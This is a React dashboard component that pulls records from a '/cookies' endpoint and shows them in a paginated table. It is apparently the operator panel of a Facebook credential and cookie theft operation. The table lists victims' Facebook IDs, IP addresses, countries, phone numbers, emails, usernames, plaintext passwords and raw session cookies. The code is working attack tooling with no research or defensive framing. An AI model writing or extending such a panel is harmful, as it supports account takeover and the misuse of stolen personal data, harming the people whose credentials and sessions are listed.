import React, { useEffect, useState } from "react"
import { Card, CardBody, CardHeader, CardTitle, Container } from "reactstrap";
import BootstrapTable from "react-bootstrap-table-next";
import paginationFactory from "react-bootstrap-table2-paginator";
import axios from 'axios'
import { BASE_URL } from '../../utils/config'
import moment from 'moment'
import PaginationPage from '../Pagination'

const TableContainer = ({ page, perPage, setPage, setPerPage }) => {

  const [data, setData] = useState([])
  const [total, setTotal] = useState(0)
  const headerStyle = {
    fontSize: 18,
    fontWeit: "bold",
  }
  const tableColumns = [
    {
      dataField: "facebookId",
      text: "Facebook Id",
      headerStyle: headerStyle,
    },
    {
      dataField: "ip",
      text: "IP Address",
      headerStyle: headerStyle,

    },

    {
      dataField: "country",
      text: "Country",
      headerStyle: headerStyle,

    },
    {
      dataField: "infoRegister",
      text: "InfoRegister",
      headerStyle: headerStyle,

      formatter: (cell) => {
        return <div>
          <p style={{ margin: 0, padding: 0 }}>{cell.phone ? `Phone: ${cell.phone}` : ""}</p>
          <p style={{ margin: 0, padding: 0 }}>{cell.email ? `Email: ${cell.email}` : ""}</p>
          <p style={{ margin: 0, padding: 0 }}>{cell.username ? `Username: ${cell.username}` : ""}</p>
          <p style={{ margin: 0, padding: 0 }}>{cell.password ? `Password: ${cell.password}` : ""}</p>
        </div>
      }
    },

    {
      dataField: "facebookId",
      text: "Avata",
      formatter: (cell) => { return <span>{cell && <img src={`https://graph.facebook.com/${cell}/picture?type=square`} alt="#" />}</span> },
      headerStyle: headerStyle,

    },
    {
      dataField: "cookies",
      text: "Cookies",
      formatter: (cell, row) => { return <div style={{ maxHeight: 100, overflowY: "auto" }}>{JSON.stringify(cell)}</div> },
      headerStyle: (colum, colIndex) => {
        return { width: '400px', textAlign: 'center' };
      },
      headerStyle: headerStyle,

    },

    {
      dataField: "createdAt",
      text: "Time",
      formatter: (cell, row) => { return <span>{moment(cell).format("DD-MM-YYYY")}</span> },
      headerStyle: headerStyle,

    },

  ];
  const token = localStorage.getItem("token")

  useEffect(() => {
    const config = {
      headers: { Authorization: `Bearer ${token}` }
    };
    axios.get(`${BASE_URL}/cookies?page=${page}&perPage=${perPage.value}`, config)
      // .then(res => setData(() => res.data.data))
      .then(res => {
        setData(res.data.data.data)
        setTotal(res.data.data.total)
      })
      .catch(err => console.log(err))
  }, [])
  useEffect(() => {
    const config = {
      headers: { Authorization: `Bearer ${token}` }
    };
    axios.get(`${BASE_URL}/cookies?page=${page}&perPage=${perPage.value}`, config)
      // .then(res => setData(() => res.data.data))
      .then(res => {
        setData(res.data.data.data)

      })
      .catch(err => console.log(err))
  }, [page, perPage])


  console.log(data)
  return (
    <div>
      <p style={{ textAlign: "center", fontSize: 30 }}> Dashboard Page</p>
      <Card>
        <CardBody>
          <PaginationPage page={page} sizePerPage={perPage} setPage={setPage} setPerPage={setPerPage} total={total} />

          <BootstrapTable
            keyField="name"
            data={data ? data : []}
            columns={tableColumns}
            bootstrap4
            bordered={true}
            striped
            hover
            condensed
            bodyClasses
            noDataIndication="Không có dữ liệu"
          // pagination={paginationFactory(options)}
          />
          <PaginationPage page={page} sizePerPage={perPage} setPage={setPage} setPerPage={setPerPage} total={total} />


        </CardBody>
      </Card>

    </div>
  )
}
export default TableContainer